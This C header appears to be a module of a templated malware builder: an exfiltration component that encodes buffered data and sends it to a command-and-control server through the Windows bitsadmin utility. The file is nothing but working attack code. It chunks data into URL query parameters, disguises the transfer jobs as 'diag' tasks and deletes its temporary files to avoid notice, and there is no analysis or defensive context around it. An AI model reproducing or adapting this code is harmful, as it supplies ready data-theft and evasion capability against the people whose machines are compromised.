// chunk: exfil/bitsadmin_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: exfiltrate, flush_to_c2
// note: LOLBin exfil via bitsadmin /transfer — data encoded in URL query params

#ifndef CHUNK_BITSADMIN_LOLBIN
#define CHUNK_BITSADMIN_LOLBIN

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static void bits_b64(const char *in, DWORD in_len, char *out, DWORD out_sz) {
    static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    DWORD i = 0, o = 0;
    while (i < in_len && o + 4 < out_sz) {
        unsigned int v = (unsigned char)in[i++] << 16;
        if (i < in_len) v |= (unsigned char)in[i++] << 8;
        if (i < in_len) v |= (unsigned char)in[i++];
        out[o++] = t[(v >> 18) & 0x3F];
        out[o++] = t[(v >> 12) & 0x3F];
        out[o++] = (i > in_len + 1) ? '.' : t[(v >> 6) & 0x3F];
        out[o++] = (i > in_len) ? '.' : t[v & 0x3F];
    }
    out[o] = '\0';
}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;
    char temp_dir[MAX_PATH], sink[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);

    DWORD chunk_sz = 1800;
    DWORD offset = 0;
    int seq = 0;
    while (offset < len) {
        DWORD this_len = (len - offset > chunk_sz) ? chunk_sz : (len - offset);
        DWORD b64_sz = this_len * 2 + 16;
        char *b64 = (char *)malloc(b64_sz);
        if (!b64) break;
        bits_b64(data + offset, this_len, b64, b64_sz);

        char job_name[64];
        snprintf(job_name, sizeof(job_name), "diag_%lx_%d", GetTickCount(), seq);
        snprintf(sink, MAX_PATH, "%s~bg_%lx.tmp", temp_dir, GetTickCount());

        char cmd[4096], out[256] = {0};
        DWORD out_len = 0;
        snprintf(cmd, sizeof(cmd),
                 "cmd /c bitsadmin /transfer \"%s\" /priority foreground "
                 "\"http://%s:%d/?s=%d&d=%s\" \"%s\" >nul 2>&1 & del \"%s\" >nul 2>&1",
                 job_name, ip, port, seq, b64, sink, sink);
        run_cmd(cmd, out, sizeof(out), &out_len);

        free(b64);
        offset += this_len;
        seq++;
    }
    return TRUE;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}

#endif
